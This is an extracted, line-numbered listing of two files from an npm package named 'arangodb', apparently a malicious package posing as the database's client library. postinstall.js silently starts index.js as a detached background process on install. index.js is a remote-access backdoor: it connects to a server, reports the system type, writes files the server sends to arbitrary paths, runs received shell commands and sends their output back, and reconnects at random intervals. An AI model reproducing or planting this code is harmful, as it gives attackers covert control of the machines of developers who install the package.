// File: tmp/tmp5doruax7/arangodb/package/index.js
// ======================================================================
Line 1: const net = require('net')
Line 2: const os = require('os')
Line 3: const fs = require('fs')
Line 4: _tmp_5 = require('child_process')
Line 16: os.platform()
Line 20: client = new net.Socket()
Line 23: {
        console.log(`Connected to server at ${SERVER_HOST}:${SERVER_PORT}`);

        // 获取设备的系统类型并发送到服务器
        console.log(`Sending system type: ${systemType}`);
        client.write(`SYSTEM_TYPE:${systemType}\n`);
    }
Line 28: client.write(`SYSTEM_TYPE:${systemType}\n`)
Line 33: data.toString('utf8').trim()
Line 35: {
                // 文件传输的开始标识，后面跟着文件名
                filePath = command.split(':')[1];
                fileStream = fs.createWriteStream(filePath);
                receivingFile = true;
                console.log(`Start receiving file: ${filePath}`);
            }
Line 37: filePath = command.split(':')[1]
Line 43: {
                    fileStream.end();
                    receivingFile = false;
                    console.log(`File received and saved to: ${filePath}`);
                    client.write(`File received: ${filePath}\n`);
                }
Line 44: fileStream.end()
Line 47: client.write(`File received: ${filePath}\n`)
Line 49: {
                // 文件内容，写入文件流
                fileStream.write(command + '\n');
            }
Line 51: fileStream.write(command + '\n')
Line 52: {
                // 普通指令处理
                console.log(`Received command: ${command}`);
                let fullCommand = command;

                // 如果是 Windows 系统，则先设置为 UTF-8
                if (systemType === 'win32') {
                    fullCommand = `chcp 65001 && ${command}`;
                }

                // 执行收到的指令
                exec(fullCommand, { encoding: 'utf8' }, (error, stdout, stderr) => {
                    if (error) {
                        console.error(`Error executing command: ${stderr}`);
                        client.write(`Error: ${stderr}\n`);
                        return;
                    }

                    // 将执行结果返回给服务器
                    client.write(`Command output: ${stdout}\n`, 'utf8');
                });
            }
Line 63: exec(fullCommand, { encoding: 'utf8' }, (error, stdout, stderr) => {
                    if (error) {
                        console.error(`Error executing command: ${stderr}`);
                        client.write(`Error: ${stderr}\n`);
                        return;
                    }

                    // 将执行结果返回给服务器
                    client.write(`Command output: ${stdout}\n`, 'utf8');
                })
Line 64: {
                        console.error(`Error executing command: ${stderr}`);
                        client.write(`Error: ${stderr}\n`);
                        return;
                    }
Line 66: client.write(`Error: ${stderr}\n`)
Line 71: client.write(`Command output: ${stdout}\n`, 'utf8')
Line 92: {
    const retryInterval = Math.floor(Math.random() * (300000 - 60000 + 1)) + 60000;  // 1 到 5 分钟之间的随机时间
    console.log(`Reconnecting in ${(retryInterval / 1000 / 60).toFixed(2)} minutes...`);

    setTimeout(() => {
        console.log('Attempting to reconnect...');
        connectToServer();
    }, retryInterval);
}
Line 96: setTimeout(() => {
        console.log('Attempting to reconnect...');
        connectToServer();
    }, retryInterval)

// File: tmp/tmp5doruax7/arangodb/package/postinstall.js
// ======================================================================
Line 1: _tmp_2 = require('child_process')
Line 3: {
  console.log('Installation complete. Running index.js in the background...');

  // 使用 spawn 启动 index.js，且不等待它完成
  const child = spawn('node', ['index.js'], {
    detached: true, // 使进程在后台运行
    stdio: 'ignore' // 忽略输出
  });

  // 让主进程不等待子进程结束
  child.unref();

  console.log('index.js is running in the background.');
}
Line 7: const child = spawn('node', ['index.js'], {
    detached: true, // 使进程在后台运行
    stdio: 'ignore' // 忽略输出
  })
